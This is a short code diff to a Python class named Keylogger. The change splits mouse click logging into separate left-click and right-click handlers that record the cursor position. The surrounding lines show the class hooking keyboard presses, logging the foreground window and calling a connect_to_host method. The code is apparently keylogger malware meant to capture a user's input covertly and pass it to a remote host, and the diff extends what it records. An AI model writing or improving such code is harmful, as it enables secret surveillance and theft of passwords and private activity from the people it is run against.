@@ -45,8 +45,11 @@ class Keylogger:
                 name = f"[{name.upper()}]"
         self.log += name
 
-    def mouse_callback(self):
+    def mouse_left_callback(self):
         self.log += f"[L_CLICK, {mouse.get_position()}]"
+    
+    def mouse_right_callback(self):
+        self.log += f"[R_CLICK, {mouse.get_position()}]"
     
     def write_keylogs_to_file(self, foreground_window):
         if self.log:
@@ -103,7 +106,8 @@ class Keylogger:
         self.connect_to_host()
         
         keyboard.on_press(callback=self.keyboard_callback)
-        mouse.on_click(callback=self.mouse_callback)
+        mouse.on_click(callback=self.mouse_left_callback)
+        mouse.on_right_click(callback=self.mouse_right_callback)
 
         foreground_window_thread = Thread(target=self.check_foreground_window)
         foreground_window_thread.start()
